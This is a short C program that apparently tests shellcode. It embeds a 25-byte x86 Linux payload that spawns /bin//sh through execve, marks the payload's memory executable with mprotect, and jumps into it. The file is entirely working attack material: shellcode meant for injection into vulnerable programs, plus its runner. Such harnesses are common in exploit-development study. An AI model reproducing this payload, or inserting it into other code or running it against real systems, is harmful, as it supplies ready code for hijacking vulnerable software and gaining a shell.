#include<stdio.h>
#include<string.h>
#include<sys/mman.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));
	int r = mprotect((void *)((int)code & ~4095), 4096, PROT_READ | PROT_WRITE|PROT_EXEC);
	printf("mrptect: %d\n", r);
	int (*ret)() = (int(*)())code;
	return ret();

}
